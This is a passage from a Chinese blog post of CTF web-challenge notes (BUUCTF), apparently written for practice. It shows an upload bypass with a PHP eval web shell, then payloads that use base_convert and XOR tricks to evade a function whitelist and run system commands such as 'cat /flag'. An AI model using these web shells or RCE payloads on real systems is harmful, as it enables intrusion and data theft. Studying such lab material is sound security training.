<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF刷题笔记（五） | A2u13's Blog</title><meta name="description" content="题目列表：  [极客大挑战 2019]Upload [CISCN 2019 初赛]Love Math [GXYCTF2019]禁止套娃 [极客大挑战 2019]HardSQL [GXYCTF2019]BabySQli [安洵杯 2019]easy_serialize_php [ACTF2020 新生赛]Include [SUCTF 2019]EasyWeb    [极客大挑战 2019]Uplo"><meta name="keywords" content="BUUCTF"><meta name="author" content="A2u13"><meta name="copyright" content="A2u13"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="http://ta.qq.com"/><link rel="dns-prefetch" href="http://ta.qq.com"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="BUUCTF刷题笔记（五）"><meta name="twitter:description" content="题目列表：  [极客大挑战 2019]Upload [CISCN 2019 初赛]Love Math [GXYCTF2019]禁止套娃 [极客大挑战 2019]HardSQL [GXYCTF2019]BabySQli [安洵杯 2019]easy_serialize_php [ACTF2020 新生赛]Include [SUCTF 2019]EasyWeb    [极客大挑战 2019]Uplo"><meta name="twitter:image" content="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><meta property="og:type" content="article"><meta property="og:title" content="BUUCTF刷题笔记（五）"><meta property="og:url" content="https://a2u13.com/2020/02/17/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/"><meta property="og:site_name" content="A2u13's Blog"><meta property="og:description" content="题目列表：  [极客大挑战 2019]Upload [CISCN 2019 初赛]Love Math [GXYCTF2019]禁止套娃 [极客大挑战 2019]HardSQL [GXYCTF2019]BabySQli [安洵杯 2019]easy_serialize_php [ACTF2020 新生赛]Include [SUCTF 2019]EasyWeb    [极客大挑战 2019]Uplo"><meta property="og:image" content="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><meta property="article:published_time" content="2020-02-17T13:16:30.000Z"><meta property="article:modified_time" content="2020-06-07T06:28:28.943Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="canonical" href="https://a2u13.com/2020/02/17/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/"><link rel="prev" title="Vulnhub靶机渗透测试（DC-1）" href="https://a2u13.com/2020/02/18/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88DC-1%EF%BC%89/"><link rel="next" title="BUUCTF刷题笔记（四）" href="https://a2u13.com/2020/02/15/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/"><script src="https://tajs.qq.com/stats?sId=&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=66562096&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;" charset="UTF-8"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://a2u13.com/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: true,
  fancybox: false,
  Snackbar: {"bookmark":{"message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  baiduPush: false,
  highlightCopy: true,
  highlightLang: false,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="A2u13's Blog" type="application/atom+xml">
</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/4A56A073590349364F32B58397E8B06C.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">33</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">22</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">15</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#极客大挑战-2019-Upload"><span class="toc-number">1.</span> <span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN-2019-初赛-Love-Math"><span class="toc-number">2.</span> <span class="toc-text">[CISCN 2019 初赛]Love Math</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GET传入参数"><span class="toc-number">2.1.</span> <span class="toc-text">$_GET传入参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getallheaders-函数"><span class="toc-number">2.2.</span> <span class="toc-text">getallheaders()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数学函数异或"><span class="toc-number">2.3.</span> <span class="toc-text">数学函数异或</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-禁止套娃"><span class="toc-number">3.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#session-id-session-start"><span class="toc-number">3.1.</span> <span class="toc-text">session_id(session_start())</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#array-rand"><span class="toc-number">3.2.</span> <span class="toc-text">array_rand()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#极客大挑战-2019-HardSQL"><span class="toc-number">4.</span> <span class="toc-text">[极客大挑战 2019]HardSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-number">5.</span> <span class="toc-text">[GXYCTF2019]BabySQli</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安洵杯-2019-easy-serialize-php"><span class="toc-number">6.</span> <span class="toc-text">[安洵杯 2019]easy_serialize_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-新生赛-Include"><span class="toc-number">7.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-EasyWeb"><span class="toc-number">8.</span> <span class="toc-text">[SUCTF 2019]EasyWeb</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#get-the-flag函数"><span class="toc-number">8.1.</span> <span class="toc-text">get_the_flag函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ph后缀绕过"><span class="toc-number">8.1.1.</span> <span class="toc-text">ph后缀绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-内容绕过"><span class="toc-number">8.1.2.</span> <span class="toc-text">&lt;?内容绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exif-imagetype绕过"><span class="toc-number">8.1.3.</span> <span class="toc-text">exif_imagetype绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令执行部分"><span class="toc-number">8.2.</span> <span class="toc-text">命令执行部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传"><span class="toc-number">8.3.</span> <span class="toc-text">文件上传</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="photo"></div><div class="post-bg" id="nav" style="background-image: url(https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">A2u13's Blog</a></span><span class="pull_right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">BUUCTF刷题笔记（五）</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-02-17 21:16:30"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-02-17</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-06-07 14:28:28"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-06-07</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"> <span class="post-meta-wordcount"><i class="post-meta__icon fa fa-file-word-o" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">3.8k</span><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-clock-o" aria-hidden="true"></i><span>阅读时长: 16 分钟</span></span></div><div class="meta-thirdline"><span class="post-meta-pv-cv"></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png" alt=""></p>
<p><strong>题目列表：</strong></p>
<ul>
<li>[极客大挑战 2019]Upload</li>
<li>[CISCN 2019 初赛]Love Math</li>
<li>[GXYCTF2019]禁止套娃</li>
<li>[极客大挑战 2019]HardSQL</li>
<li>[GXYCTF2019]BabySQli</li>
<li>[安洵杯 2019]easy_serialize_php</li>
<li>[ACTF2020 新生赛]Include</li>
<li>[SUCTF 2019]EasyWeb</li>
</ul>
<a id="more"></a>

<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>这道题之前成信工新生赛的时候做过，测出来得上传<code>phtml</code>文件上传</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218000338.png" alt=""></p>
<p>这个可以通过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_GET[<span class="string">'a'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>来绕过</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218000447.png" alt=""></p>
<p>这个可以通过增加<code>GIF89a</code>头部幻数来绕过</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218000530.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218000652.png" alt=""></p>
<p>最后访问连接一句话得到<code>flag</code></p>
<h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里给了源码</p>
<p>这道题给了许多数学函数，但没有给<code>hex2bin</code>，这里我们得构造出<code>hex2bin</code>这个函数</p>
<p>通过使用<code>base_convert</code>函数，可以实现任意进制之间互相转化</p>
<p>由于这里只容许输入数字和那几个数学函数，那么可以考虑从十进制往高进制进行转换，就可以组合成我们需要的字符串，比如：</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200225012300.png" alt=""></p>
<p>这里限定了长度为最多80位，那么得尽量缩短<code>payload</code>长度</p>
<p>这里写了个脚本来找一下从十进制转换到能生成<code>hex2bin</code>字符串最少位数的高位进制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$strr = <span class="string">"hex2bin"</span>;</span><br><span class="line">    <span class="keyword">for</span>($k=<span class="number">36</span>;$k&gt;=<span class="number">1</span>;$k--)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $k.<span class="string">"=&gt;"</span>.<span class="string">"10"</span>.<span class="string">":"</span>.strlen(base_convert($strr, $k, <span class="number">10</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200225012528.png" alt=""></p>
<p>由于字母<code>x</code>需要最小进制为34进制，而34进制以上的进制位数都一致，那么这里选择34进制来构造<code>hex2bin</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200225012705.png" alt=""></p>
<p>那么可以通过<code>base_convert(26941962055,10,34)</code>来构造出<code>hex2bin</code></p>
<h2 id="GET传入参数"><a href="#GET传入参数" class="headerlink" title="$_GET传入参数"></a>$_GET传入参数</h2><p>有了<code>hex2bin</code>，那么来构造<code>_GET</code></p>
<blockquote>
<p><code>_GET</code>的十六进制为<code>5f474554</code></p>
<p>通过<code>hexdec</code>函数得到<code>_GET</code>的十进制为<code>1598506324</code></p>
</blockquote>
<p>则可以通过<code>base_convert(26941962055,10,34)(dechex(1598506324))</code>来过的<code>_GET</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200225013340.png" alt=""></p>
<p>由于<code>pi</code>输入数学函数没有被过滤，则可以通过</p>
<p><code>$pi=base_convert(26941962055,10,34)(dechex(1598506324))</code>来把<code>_GET</code>赋给<code>pi</code></p>
<p>由于<code>PHP</code>的动态变量，可以通过<code>$$pi</code>来实现<code>$_GET</code></p>
<p>有了<code>$_GET</code>就可以传入数据了，<code>$_GET[xxxx]</code>其中<code>[]</code>可以<code>{}</code>来替代</p>
<p>此时传入变量即可</p>
<blockquote>
<p><code>($$pi){1} =&gt; $_GET[1]</code></p>
<p><code>($$PI){1}(($$pi){2}) =&gt; $_GET[1]($_GET[2])</code></p>
</blockquote>
<p>传入<code>GET</code>参数</p>
<p><code>1=system&amp;2=cmd</code>即可</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/?c=<span class="symbol">$</span><span class="built-in">pi</span>=base_convert(<span class="number">26941962055</span>,<span class="number">10</span>,<span class="number">34</span>)(dechex(<span class="number">1598506324</span>));(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="number">1</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="number">2</span>&#125;)&amp;<span class="number">1</span>=<span class="keyword">system</span>&amp;<span class="number">2</span>=ls /</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226140643.png" alt=""></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/?c=<span class="symbol">$</span><span class="built-in">pi</span>=base_convert(<span class="number">26941962055</span>,<span class="number">10</span>,<span class="number">34</span>)(dechex(<span class="number">1598506324</span>));(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="number">1</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="number">2</span>&#125;)&amp;<span class="number">1</span>=<span class="keyword">system</span>&amp;<span class="number">2</span>=cat /flag</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226140726.png" alt=""></p>
<h2 id="getallheaders-函数"><a href="#getallheaders-函数" class="headerlink" title="getallheaders()函数"></a>getallheaders()函数</h2><p><a href="https://www.php.net/manual/zh/function.getallheaders.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.getallheaders.php</a></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226141248.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226145249.png" alt=""></p>
<p>这里同样构造</p>
<blockquote>
<p><code>$pi=base_convert</code><br>​<code>$pi(8768397090111664438,10,30) =&gt; getallheaders</code><br><code>$pi(1522870287,10,35) =&gt; system</code></p>
</blockquote>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/?c=$pi=base_convert,$pi(<span class="number">1522870287</span>,<span class="number">10</span>,<span class="number">35</span>)($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure>


<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226145341.png" alt=""></p>
<h2 id="数学函数异或"><a href="#数学函数异或" class="headerlink" title="数学函数异或"></a>数学函数异或</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">0</span>;$k&lt;sizeof($whitelist);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">9</span>;$i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">            $payload = $whitelist[$k] ^ $i.$j;</span><br><span class="line">            <span class="keyword">if</span>(strcmp($payload, <span class="string">"_G"</span>)==<span class="number">0</span> || strcmp($payload, <span class="string">"ET"</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $whitelist[$k] . <span class="string">"^"</span> . $i.$j.$z.$x.$y . <span class="string">"=&gt;"</span> . $payload;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226153558.png" alt=""></p>
<blockquote>
<p><code>is_nan^(6).(4) =&gt; _G</code></p>
<p><code>tan^(1).(5) =&gt; ET</code></p>
<p><code>(is_nan^(6).(4)).(tan^(1).(5)) =&gt; _GET</code></p>
</blockquote>
<p>同理构造即可读到<code>flag</code></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/?c=<span class="symbol">$</span><span class="built-in">pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(<span class="built-in">tan</span>^(<span class="number">1</span>).(<span class="number">5</span>));<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>&#123;<span class="built-in">abs</span>&#125;(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>&#123;<span class="built-in">pi</span>&#125;)&amp;<span class="built-in">abs</span>=<span class="keyword">system</span>&amp;<span class="built-in">pi</span>=cat /flag</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226154022.png" alt=""></p>
<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>扫一下目录</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226155247.png" alt=""></p>
<p>有<code>Git</code>泄露，恢复一下</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226155313.png" alt=""></p>
